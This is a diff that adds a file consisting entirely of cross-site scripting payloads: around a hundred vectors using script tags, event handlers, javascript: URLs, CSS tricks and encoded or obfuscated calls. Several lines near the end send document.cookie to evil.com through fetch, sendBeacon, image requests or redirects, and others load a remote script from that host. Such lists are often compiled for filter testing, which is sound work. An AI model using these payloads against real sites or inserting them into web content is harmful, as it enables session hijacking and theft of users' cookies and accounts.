@@ -1,0 +1,107 @@
+<script>alert('XSS')</script>
+<img src=x onerror=alert('XSS')>
+javascript:alert('XSS')
+<iframe src="javascript:alert('XSS')"></iframe>
+<svg onload=alert('XSS')>
+<body onload=alert('XSS')>
+<input onfocus=alert('XSS') autofocus>
+<select onfocus=alert('XSS') autofocus>
+<textarea onfocus=alert('XSS') autofocus>
+<keygen onfocus=alert('XSS') autofocus>
+<video><source onerror="alert('XSS')">
+<audio src=x onerror=alert('XSS')>
+<details open ontoggle=alert('XSS')>
+<marquee onstart=alert('XSS')>
+<meter onmouseover=alert('XSS')>
+<progress onmouseover=alert('XSS')>
+<object data="javascript:alert('XSS')">
+<embed src="javascript:alert('XSS')">
+<applet code="javascript:alert('XSS')">
+<form><button formaction="javascript:alert('XSS')">
+<isindex action="javascript:alert('XSS')">
+<table background="javascript:alert('XSS')">
+<td background="javascript:alert('XSS')">
+<th background="javascript:alert('XSS')">
+<bgsound src="javascript:alert('XSS')">
+<link rel="stylesheet" href="javascript:alert('XSS')">
+<meta http-equiv="refresh" content="0;url=javascript:alert('XSS')">
+<style>@import'javascript:alert("XSS")';</style>
+<style>body{background:url("javascript:alert('XSS')")}</style>
+<style>li{list-style-image:url("javascript:alert('XSS')")}</style>
+<div style="background-image:url(javascript:alert('XSS'))">
+<div style="width:expression(alert('XSS'))">
+<img src="x" style="background-image:url(javascript:alert('XSS'))">
+<base href="javascript:alert('XSS')//">
+<blink>test</blink>
+<blockquote cite="javascript:alert('XSS')">
+<body alink="javascript:alert('XSS')">
+<body background="javascript:alert('XSS')">
+<body bgproperties="javascript:alert('XSS')">
+<body link="javascript:alert('XSS')">
+<body text="javascript:alert('XSS')">
+<body vlink="javascript:alert('XSS')">
+<del cite="javascript:alert('XSS')">
+<frame src="javascript:alert('XSS')">
+<frameset onload="javascript:alert('XSS')">
+<head profile="javascript:alert('XSS')">
+<html manifest="javascript:alert('XSS')">
+<ins cite="javascript:alert('XSS')">
+<layer src="javascript:alert('XSS')">
+<layer onload="javascript:alert('XSS')">
+<ilayer src="javascript:alert('XSS')">
+<ilayer onload="javascript:alert('XSS')">
+<q cite="javascript:alert('XSS')">
+<xml src="javascript:alert('XSS')">
+<xml id="xss"><a><b>&lt;script&gt;alert('XSS')&lt;/script&gt;</b></a></xml>
+<div datafld="b" dataformatas="html" datasrc="#xss">
+<div datafld="b" dataformatas="text" datasrc="#xss">
+<script src="javascript:alert('XSS')">
+<script language="javascript">alert('XSS')</script>
+<script type="text/javascript">alert('XSS')</script>
+<script>alert(String.fromCharCode(88,83,83))</script>
+<script>\u0061lert('XSS')</script>
+<script>eval('\x61lert(\'XSS\')')</script>
+<script>eval(unescape('%61%6c%65%72%74%28%27%58%53%53%27%29'))</script>
+<script>alert(/XSS/.source)</script>
+<script>setTimeout("alert('XSS')",1)</script>
+<script>setInterval("alert('XSS')",1)</script>
+<script>Function("alert('XSS')")()</script>
+<script>[].constructor.constructor("alert('XSS')")()</script>
+<script>top["al"+"ert"]("XSS")</script>
+<script>top[/al/.source+/ert/.source]("XSS")</script>
+<script>al\u0065rt('XSS')</script>
+<script>al\x65rt('XSS')</script>
+<script>eval('al\145rt("XSS")')</script>
+<script>_=alert,_(1)</script>
+<script>alert`1`</script>
+<script>(alert)(1)</script>
+<script>a=alert,a(1)</script>
+<script>[1].find(alert)</script>
+<script>window['alert'](1)</script>
+<script>parent['alert'](1)</script>
+<script>self['alert'](1)</script>
+<script>top['alert'](1)</script>
+<script>frames['alert'](1)</script>
+<script>globalThis['alert'](1)</script>
+<script>this['alert'](1)</script>
+<script>alert(1)</script>
+<script>prompt(1)</script>
+<script>confirm(1)</script>
+<script>alert(document.domain)</script>
+<script>alert(document.cookie)</script>
+<script>alert(localStorage)</script>
+<script>alert(sessionStorage)</script>
+<script>new Image().src='http://evil.com/steal.php?cookie='+document.cookie</script>
+<script>fetch('http://evil.com/steal.php?cookie='+document.cookie)</script>
+<script>navigator.sendBeacon('http://evil.com/steal.php',document.cookie)</script>
+<script>location='http://evil.com/steal.php?cookie='+document.cookie</script>
+<script>document.location='http://evil.com/steal.php?cookie='+document.cookie</script>
+<script>window.location='http://evil.com/steal.php?cookie='+document.cookie</script>
+<script>top.location='http://evil.com/steal.php?cookie='+document.cookie</script>
+<script>parent.location='http://evil.com/steal.php?cookie='+document.cookie</script>
+<script>document.write('<script src=http://evil.com/xss.js><\/script>')</script>
+<script>document.body.innerHTML='<script src=http://evil.com/xss.js><\/script>'</script>
+<script>eval(atob('YWxlcnQoJ1hTUycpOw=='))</script>
+<script>Function(atob('YWxlcnQoJ1hTUycpOw=='))()</script>
+<script>setTimeout(atob('YWxlcnQoJ1hTUycpOw=='),1)</script>
+<script>setInterval(atob('YWxlcnQoJ1hTUycpOw=='),1)</script>
